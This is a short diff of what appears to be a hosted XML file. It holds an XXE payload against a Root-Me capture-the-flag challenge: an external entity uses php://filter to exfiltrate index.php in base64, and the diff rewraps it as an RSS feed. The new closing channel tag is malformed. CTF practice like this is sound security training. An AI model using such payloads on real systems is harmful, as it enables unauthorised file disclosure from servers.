@@ -7,8 +7,11 @@ layout: null
    <!ELEMENT title ANY >
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://challenge01.root-me.org/web-serveur/ch29/index.php" >
 ]>
-<xml xmlns:slash="http://purl.org/rss/1.0/modules/slash/" version="2.0">
-<item>
-   <title>&xxe;</title>
-</item>
-</xml>
+<rss xmlns:slash="http://purl.org/rss/1.0/modules/slash/" version="2.0">
+   <channel>
+      <item>
+         <title>&xxe;</title>
+         <description>...</description>
+      </item>
+   <channel>
+</rss>
